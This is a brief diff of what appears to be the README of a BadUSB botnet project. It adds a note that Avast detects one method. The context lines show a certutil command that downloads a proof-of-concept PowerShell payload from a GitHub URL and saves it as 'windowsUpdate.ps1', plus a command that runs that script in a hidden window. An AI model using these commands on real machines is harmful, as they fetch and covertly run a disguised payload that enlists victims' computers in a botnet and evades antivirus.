@@ -101,7 +101,7 @@ Windows Powershell is too slow at startup, so we can use cmd to download the '.p
 > powershell.exe -windowstyle hidden -file "Documents/windowsUpdate.ps1"
 ```
 
-or
+or (Avast detect)
 
 ```cmd
 > certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1" "Documents/windowsUpdate.ps1"
